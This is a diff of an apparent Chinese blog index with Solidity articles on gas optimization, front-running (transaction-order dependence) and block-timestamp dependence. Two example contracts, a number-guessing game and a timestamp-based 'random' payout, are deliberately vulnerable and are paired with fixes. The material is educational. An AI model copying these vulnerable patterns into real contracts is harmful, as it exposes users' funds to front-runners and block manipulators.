+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPositionLendingTokenByIndex(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _index</span><br><span class="line">)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (address)</span><br><span class="line">&#123;</span><br><span class="line">    return positionLendTokenData[_nftId][_index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>将<code>public</code>修饰符改为<code>internal</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) internal positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="使用-payable-函数"><a href="#使用-payable-函数" class="headerlink" title="使用 payable 函数"></a>使用 payable 函数</h3><p>payable函数比非payable函数消耗更少的gas，因为payable函数允许用户在调用函数时传递非0或0ETH，而不需要检查ETH转账。<br><strong>注：虽然节省gas很重要，如果一个函数与接收ETH无关，即使能节省gas也不应附加任何payable修饰符。</strong></p>
+<h2 id="编译器优化"><a href="#编译器优化" class="headerlink" title="编译器优化"></a>编译器优化</h2><h3 id="unchecked除法"><a href="#unchecked除法" class="headerlink" title="unchecked除法"></a>unchecked除法</h3><p>从 Solidity 0.8.0 版本开始，所有的算术运算默认就会进行溢出检查。Unchecked 代码块，提示编译器不安全地执行算术操作。前提是保证 unchecked 代码块中的内容能够安全的执行，从而可以节省Gas成本。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant ONE_WEEK = 7 days;</span><br><span class="line">function previewDistribution()</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    if (totalLpAssetsToDistribute == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (block.timestamp == lastInteraction) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (totalLpAssetsToDistribute &lt; ONE_WEEK) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 currentRate = totalLpAssetsToDistribute</span><br><span class="line">        / ONE_WEEK;                      // unckecked</span><br><span class="line"></span><br><span class="line">    uint256 additonalAssets = currentRate</span><br><span class="line">        * (block.timestamp - lastInteraction);</span><br><span class="line"></span><br><span class="line">    if (additonalAssets &gt; totalLpAssetsToDistribute) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return additonalAssets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>分母为0或负数的情况，以上代码不需要检查，添加unchecked可以节省Gas。</p>
+]]></content>
+      <tags>
+        <tag>智能合约安全审计</tag>
+        <tag>Solidity</tag>
       </tags>
   </entry>
   <entry>
@@ -140,62 +201,42 @@
       </tags>
   </entry>
   <entry>
-    <title>Gas优化（一）</title>
-    <url>/2024/04/13/GAS%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/</url>
-    <content><![CDATA[<p>以太坊网络上的每个操作，从简单的转账到复杂的合约交互，都需要消耗Gas。Gas机制不仅防止了网络资源的滥用，还通过设置交易的 Gas Limit 确保每个操作计算资源使用在合理范围内，从而保障网络的安全性和稳定性。</p>
-<h2 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h2><h3 id="减少存储变量的读取"><a href="#减少存储变量的读取" class="headerlink" title="减少存储变量的读取"></a>减少存储变量的读取</h3><p>读取存储变量至少需要100gas（在EVM中，每次第一次访问任何存储变量时都必须付费，这称为“冷”访问，需要花费2100个gas。第二次或连续一次被称为“热”访问，需要花费 100 Gas。），因为Solidity不会缓存存储读取。<br>如下例子中存储变量<code>_decimalsETH</code>被重复读取</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getTokensFromUSD(</span><br><span class="line">    address _tokenAddress,</span><br><span class="line">    uint256 _usdValue</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    uint8 tokenDecimals = _tokenDecimals[</span><br><span class="line">        _tokenAddress</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    return _decimalsETH &lt; tokenDecimals     //第一次</span><br><span class="line">        ? _usdValue</span><br><span class="line">            * 10 ** (tokenDecimals - _decimalsETH)   //第二次</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">        : _usdValue</span><br><span class="line">            * 10 ** decimals(_tokenAddress)</span><br><span class="line">            / latestResolver(_tokenAddress)</span><br><span class="line">            / 10 ** (_decimalsETH - tokenDecimals);   //第二次</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>采用临时变量来缓存存储变量节省gas。</p>
-<h3 id="使用存储指针"><a href="#使用存储指针" class="headerlink" title="使用存储指针"></a>使用存储指针</h3><p>将整个结构体从存储中复制到内存中，包含了不需要的变量。而使用存储指针，通过引用传递只进行一次存储加载而不需要再从内存复制回存储中。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseReservedForCompound(</span><br><span class="line">    address _pendleMarket,</span><br><span class="line">    uint256[] calldata _amounts</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyChildContract(_pendleMarket)</span><br><span class="line">&#123;</span><br><span class="line">    CompoundStruct memory childInfo = pendleChildCompoundInfo[</span><br><span class="line">        _pendleMarket</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 length = childInfo.rewardTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; length) &#123;</span><br><span class="line">        childInfo.reservedForCompound[i] += _amounts[i];</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pendleChildCompoundInfo[_pendleMarket] = childInfo;</span><br><span class="line"></span><br><span class="line">    emit IncreaseReservedForCompound(</span><br><span class="line">        _pendleMarket,</span><br><span class="line">        _amounts</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>将<code>memery</code>改为<code>storage </code>，并删除<code>pendleChildCompoundInfo[_pendleMarket] = childInfo;</code>.</p>
-<h3 id="减少0值写入"><a href="#减少0值写入" class="headerlink" title="减少0值写入"></a>减少0值写入</h3><p>在存储变量做计算赋值时，应避免0的计算。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function increaseIncentiveA(</span><br><span class="line">    uint256 _value</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyIncentiveMaster</span><br><span class="line">&#123;</span><br><span class="line">    incentiveUSD[incentiveOwnerA] += _value;</span><br><span class="line"></span><br><span class="line">    emit IncentiveIncreasedA(</span><br><span class="line">        _value,</span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p><code>_value</code>如果为0，<code>incentiveUSD[incentiveOwnerA]</code>并没有发生变化，可以不进行加法运算，减少存储变量的读写操作。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">error ZeroValue();</span><br><span class="line">if(_value == 0) &#123;</span><br><span class="line">    revert ZeroValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>先<code>_value</code>判断是否为0，再进行加法操作。</p>
-<h3 id="只读参数使用calldata比memory便宜"><a href="#只读参数使用calldata比memory便宜" class="headerlink" title="只读参数使用calldata比memory便宜"></a>只读参数使用calldata比memory便宜</h3><p>直接从calldata中加载函数输入或数据比从内存中加载更便宜，因为从calldata访问数据涉及的操作和gas成本较少。因此，建议仅在函数需要修改数据时使用memory（calldata无法修改）。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setBaseURI(</span><br><span class="line">    string memory _newBaseURI   // 用calldata代替memory</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    baseURI = _newBaseURI;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="变量优化"><a href="#变量优化" class="headerlink" title="变量优化"></a>变量优化</h2><p>Solidity中使用连续的插槽（32字节slot）来存储变量。当存储变量远小于32字节时，可以将多个32字节的存储变量打包到同一个插槽中优化gas使用。如果我们试图打包的变量超过当前槽的32字节限制，它将被存储在一个新的插槽中。<br><strong>值类型：</strong><br>整型(int&#x2F;uint)   uint256 32字节      (另外，enum枚举类型会被编译器自动转换成uint8类型)<br>地址类型(address)  address 20字节<br>布尔类型(bool)    bool 1字节<br>字节类型(byte)  bytes1 bytes2 bytes3 … bytes32  1~32字节<br>定长数组(uint[3],byte[2]..),  字节大小根据实际长度计算</p>
-<p>映射和动态数组的大小是不可预知的，它们本身只占32个字节，它们所包含的元素被存储在不同的存储槽，该存储槽是用Keccak-256哈希计算而来。<br><strong>引用类型：</strong>（占用字节数需要具体计算）<br>动态数组(uint[], byte[], string, address[]…)<br>映射(mapping)<br>结构体(struct) </p>
-<h3 id="打包存储变量"><a href="#打包存储变量" class="headerlink" title="打包存储变量"></a>打包存储变量</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">uint256 public totalDebt;</span><br><span class="line">bool public strategyActive;</span><br></pre></td></tr></table></figure></div>
-<p>由于以上布局会使用3个插槽，调整布局进行变量打包，会把strategyActive和pool打包到1个插槽里，从而节省gas。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public pool;</span><br><span class="line">bool public strategyActive;</span><br><span class="line">uint256 public totalDebt;</span><br></pre></td></tr></table></figure></div>
-<p>打包后，会使用2个插槽。</p>
-<h3 id="打包结构体成员变量"><a href="#打包结构体成员变量" class="headerlink" title="打包结构体成员变量"></a>打包结构体成员变量</h3><p>在Solidity中，结构体成员从初始化的槽位置开始按顺序存储在合约的存储中。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123; //  can be tightly packed by moving borrowType and liquidatable at the end</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    BorrowType borrowType; //  1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //   1 byte</span><br><span class="line">    uint256 liquidatedAt; // 32 bytes</span><br><span class="line">    address liquidator; // 20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>打包成员变量，可以节省gas。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PositionPreview &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 nftIndex;</span><br><span class="line">    bytes32 nftType;</span><br><span class="line">    uint256 nftValueUSD;</span><br><span class="line">    VaultSettings vaultSettings;</span><br><span class="line">    uint256 creditLimit;</span><br><span class="line">    uint256 debtPrincipal;</span><br><span class="line">    uint256 debtInterest; //  32 bytes</span><br><span class="line">    uint256 liquidatedAt; //  32 bytes</span><br><span class="line">    BorrowType borrowType; // 1 byte (this enum is equivalent to uint8 as it has less than 256 options)</span><br><span class="line">    bool liquidatable; //  1 byte</span><br><span class="line">    address liquidator; //  20 bytes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+    <title>交易顺序依赖漏洞</title>
+    <url>/2023/10/22/%E4%BA%A4%E6%98%93%E9%A1%BA%E5%BA%8F%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>交易顺序依赖（TOD）漏洞是一种可能存在于智能合约中的条件竞争漏洞。这些也称为抢先交易（Front-running，抢跑）。由于所有的交易信息都是公开的，区块链中的抢先交易比传统金融更容易实现。</p>
+<p>当交易进入未确认的交易池（mempool），可能被旷工无序地包含在区块中，这取决于矿工的交易选择标准，有可能是交易手续费，也可能是其他任何标准。例如用户可以通过支付更高的 gas 费来保证优先打包，从而扰乱交易顺序。当然，任何改变交易顺序可以让矿工获利的行为，都可能驱使矿工这样做。</p>
+<p>由于交易发送方从发送交易到交易被确认，这中间的时间间隔就为抢跑提供可能性。如果合约的行为依赖于交易的执行顺序，攻击者就可以通过调整交易的执行顺序来获利。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>如以下合约为猜数字游戏，猜对数字即为获胜者。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17; </span><br><span class="line"></span><br><span class="line">contract numGuess &#123;</span><br><span class="line">    uint256 private number;</span><br><span class="line">    address public owner; </span><br><span class="line">    address public winner;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置数字</span><br><span class="line">    function setNum(uint256 num) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        number = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 猜数字</span><br><span class="line">    function guess(uint256 _guess) external &#123;</span><br><span class="line">        if (_guess == number)</span><br><span class="line">        &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>该合约存在交易顺序依赖（TOD）风险，如果玩家猜对数字并提交交易，作弊者将监控到待确认的交易池（mempool）中的正确答案，作弊立即提交包含正确答案的交易并提高 gas 费，从而使自己的交易被优先打包成为获胜者。</p>
+<p>一般是通过预提交哈希（commit reveal hash）来进行缓解，不直接传答案，通过传递答案和其它参数计算的哈希值，等竞猜时间过了之后，再进行验证。例如以下修复后的代码，通过计算答案，盐，用户地址等的哈希值存储到合约中，然后等到指定时间后答案和获胜者是否匹配。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17; </span><br><span class="line"></span><br><span class="line">contract numGuess &#123;</span><br><span class="line">    uint256 private number;</span><br><span class="line">    address public owner; </span><br><span class="line">    address public winner;</span><br><span class="line">    mapping (address =&gt; bytes32) public playerHashes; </span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置数字</span><br><span class="line">    function setNum(uint256 num) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        number = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 预先存储哈希值</span><br><span class="line">    function storeHash(bytes32 _hash) external &#123;</span><br><span class="line">        playerHashes[msg.sender] = _hash; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 猜数字</span><br><span class="line">    function guess(uint256 _guess, uint256 _salt) external &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(_guess, _salt, msg.sender)) == playerHashes[msg.sender] &amp;&amp; _guess == number)</span><br><span class="line">        &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 
-
-
-<h2 id="函数优化"><a href="#函数优化" class="headerlink" title="函数优化"></a>函数优化</h2><h3 id="使用函数命名式-returns-返回值"><a href="#使用函数命名式-returns-返回值" class="headerlink" title="使用函数命名式(returns)返回值"></a>使用函数命名式(returns)返回值</h3><p>Solidity中两个关键字：<code>return</code>和<code>returns</code>，区别是：</p>
-<ul>
-<li><code>return</code>: 在函数主体中，用于返回指定的变量；</li>
-<li><code>returns</code>: 加在函数名后面，用于生命返回的变量类型及变量名。</li>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>使用预提交方案（commit reveal scheme），如上案例；</li>
+<li>使用暗池，用户发出的交易将不进入公开待确认的交易池（也就是不对外广播，公开的网络中无法看到这个交易），而是直接到矿工手里。例如 flashbots 和 TaiChi；</li>
+<li>在调用参数中加上保护性参数，如滑点保护，从而减少抢跑者的潜在收益。</li>
 </ul>
-<p>在returns中标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return。每个变量可以节省9gas。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract TestContract  &#123;</span><br><span class="line">    function NoNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256) </span><br><span class="line">    &#123;</span><br><span class="line">        uint256 sum;</span><br><span class="line"></span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function UsingNamedReturn(uint256[] calldata inputs) </span><br><span class="line">        external </span><br><span class="line">        pure </span><br><span class="line">        returns(uint256 sum) </span><br><span class="line">    &#123;</span><br><span class="line">        for(uint256 i; i&lt;inputs.length; i++) &#123;</span><br><span class="line">            sum += inputs[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="合并仅调用一次的internal函数"><a href="#合并仅调用一次的internal函数" class="headerlink" title="合并仅调用一次的internal函数"></a>合并仅调用一次的internal函数</h3><p>当某个被调用函数仅调用一次时，可以重构并合并到调用函数当中，函数调用会增加额外的堆栈和JUMP指令等开销。<br><strong>注：这可能会影响代码原有结构，适用于代码量少的函数，慎用。</strong></p>
-<h2 id="修饰符优化"><a href="#修饰符优化" class="headerlink" title="修饰符优化"></a>修饰符优化</h2><h3 id="选择合适的变量可见性"><a href="#选择合适的变量可见性" class="headerlink" title="选择合适的变量可见性"></a>选择合适的变量可见性</h3><p>避免使用公共变量（public），公共变量隐式创建一个getter函数，这可能会增加合约的大小和Gas使用。</p>
-<p>父合约<code>contracts/WiseLendingDeclaration.sol</code>定义存储变量：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) public positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
-<p>子合约<code>contracts/WiseLowLevelHelper.sol</code>使用：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getPositionLendingTokenByIndex(</span><br><span class="line">    uint256 _nftId,</span><br><span class="line">    uint256 _index</span><br><span class="line">)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (address)</span><br><span class="line">&#123;</span><br><span class="line">    return positionLendTokenData[_nftId][_index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>将<code>public</code>修饰符改为<code>internal</code>：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint256 =&gt; address[]) internal positionLendTokenData;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="使用-payable-函数"><a href="#使用-payable-函数" class="headerlink" title="使用 payable 函数"></a>使用 payable 函数</h3><p>payable函数比非payable函数消耗更少的gas，因为payable函数允许用户在调用函数时传递非0或0ETH，而不需要检查ETH转账。<br><strong>注：虽然节省gas很重要，如果一个函数与接收ETH无关，即使能节省gas也不应附加任何payable修饰符。</strong></p>
-<h2 id="编译器优化"><a href="#编译器优化" class="headerlink" title="编译器优化"></a>编译器优化</h2><h3 id="unchecked除法"><a href="#unchecked除法" class="headerlink" title="unchecked除法"></a>unchecked除法</h3><p>从 Solidity 0.8.0 版本开始，所有的算术运算默认就会进行溢出检查。Unchecked 代码块，提示编译器不安全地执行算术操作。前提是保证 unchecked 代码块中的内容能够安全的执行，从而可以节省Gas成本。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant ONE_WEEK = 7 days;</span><br><span class="line">function previewDistribution()</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    if (totalLpAssetsToDistribute == 0) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (block.timestamp == lastInteraction) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (totalLpAssetsToDistribute &lt; ONE_WEEK) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 currentRate = totalLpAssetsToDistribute</span><br><span class="line">        / ONE_WEEK;                      // unckecked</span><br><span class="line"></span><br><span class="line">    uint256 additonalAssets = currentRate</span><br><span class="line">        * (block.timestamp - lastInteraction);</span><br><span class="line"></span><br><span class="line">    if (additonalAssets &gt; totalLpAssetsToDistribute) &#123;</span><br><span class="line">        return totalLpAssetsToDistribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return additonalAssets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>分母为0或负数的情况，以上代码不需要检查，添加unchecked可以节省Gas。</p>
 ]]></content>
       <tags>
-        <tag>智能合约安全审计</tag>
-        <tag>Solidity</tag>
+        <tag>区块链安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链信息依赖漏洞</title>
+    <url>/2023/10/14/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BF%A1%E6%81%AF%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于合约可以访问区块信息（如区块编号block number，区块难度block difficulty 和区块时间戳 block timestamp等），合约的执行逻辑可能依赖区块信息。负责验证并打包区块的矿工可以在一定可控的范围内调整正在处理的区块信息。以时间戳为例，在合并（The Merge，从 PoW 升级到 PoS ）之前，以太坊矿工可以操纵区块时间，允许有900秒的偏移（<strong>注</strong>：在合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中存在）。因此，当矿工所处理的交易与自己的利益直接相关或有其他利益驱动时，此矿工便可以通过操纵区块信息来控制易受攻击的合约，以使合约的运行朝着有利于自己的方向运行。</p>
+<p>区块信息常常被开发者用于计算<strong>熵</strong>（随机性），而依赖此运行的合约就可能存在安全风险。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>例如基于时间戳依赖漏洞，当区块时间戳能被 101 整除时可以获取奖励，以太坊矿工可以通过控制区块时间从而获取奖励，代码如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract PlayGame &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        if(block.timestamp % 101 == 0) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>减少合约逻辑对区块信息的依赖，以防被操控；</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>区块链安全</tag>
       </tags>
   </entry>
   <entry>
@@ -229,263 +270,6 @@
 <li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
 <li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
 </ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>交易顺序依赖漏洞</title>
-    <url>/2023/10/22/%E4%BA%A4%E6%98%93%E9%A1%BA%E5%BA%8F%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>交易顺序依赖（TOD）漏洞是一种可能存在于智能合约中的条件竞争漏洞。这些也称为抢先交易（Front-running，抢跑）。由于所有的交易信息都是公开的，区块链中的抢先交易比传统金融更容易实现。</p>
-<p>当交易进入未确认的交易池（mempool），可能被旷工无序地包含在区块中，这取决于矿工的交易选择标准，有可能是交易手续费，也可能是其他任何标准。例如用户可以通过支付更高的 gas 费来保证优先打包，从而扰乱交易顺序。当然，任何改变交易顺序可以让矿工获利的行为，都可能驱使矿工这样做。</p>
-<p>由于交易发送方从发送交易到交易被确认，这中间的时间间隔就为抢跑提供可能性。如果合约的行为依赖于交易的执行顺序，攻击者就可以通过调整交易的执行顺序来获利。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>如以下合约为猜数字游戏，猜对数字即为获胜者。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17; </span><br><span class="line"></span><br><span class="line">contract numGuess &#123;</span><br><span class="line">    uint256 private number;</span><br><span class="line">    address public owner; </span><br><span class="line">    address public winner;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置数字</span><br><span class="line">    function setNum(uint256 num) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        number = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 猜数字</span><br><span class="line">    function guess(uint256 _guess) external &#123;</span><br><span class="line">        if (_guess == number)</span><br><span class="line">        &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>该合约存在交易顺序依赖（TOD）风险，如果玩家猜对数字并提交交易，作弊者将监控到待确认的交易池（mempool）中的正确答案，作弊立即提交包含正确答案的交易并提高 gas 费，从而使自己的交易被优先打包成为获胜者。</p>
-<p>一般是通过预提交哈希（commit reveal hash）来进行缓解，不直接传答案，通过传递答案和其它参数计算的哈希值，等竞猜时间过了之后，再进行验证。例如以下修复后的代码，通过计算答案，盐，用户地址等的哈希值存储到合约中，然后等到指定时间后答案和获胜者是否匹配。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17; </span><br><span class="line"></span><br><span class="line">contract numGuess &#123;</span><br><span class="line">    uint256 private number;</span><br><span class="line">    address public owner; </span><br><span class="line">    address public winner;</span><br><span class="line">    mapping (address =&gt; bytes32) public playerHashes; </span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置数字</span><br><span class="line">    function setNum(uint256 num) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        number = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 预先存储哈希值</span><br><span class="line">    function storeHash(bytes32 _hash) external &#123;</span><br><span class="line">        